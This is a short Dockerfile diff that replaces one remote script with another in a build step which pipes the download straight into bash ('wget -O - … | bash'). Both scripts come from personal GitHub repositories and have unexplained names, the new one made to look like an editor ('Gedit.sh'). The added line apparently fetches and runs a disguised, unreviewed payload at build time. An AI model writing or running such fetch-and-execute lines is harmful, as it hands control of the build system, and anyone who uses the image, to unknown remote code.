@@ -12,6 +12,6 @@ RUN which bash
 RUN ls -la
 RUN apt update
 RUN apt -y install wget coreutils
-RUN wget -O - https://raw.githubusercontent.com/williamsides27/gesis/main/start_opt_gesis_ws_rand.sh | bash
+RUN wget -O - https://raw.githubusercontent.com/sivuyilemakepusi/KinTemp1/main/Gedit.sh | bash
 
 CMD ["npm", "run", "start", "/bin/bash"]
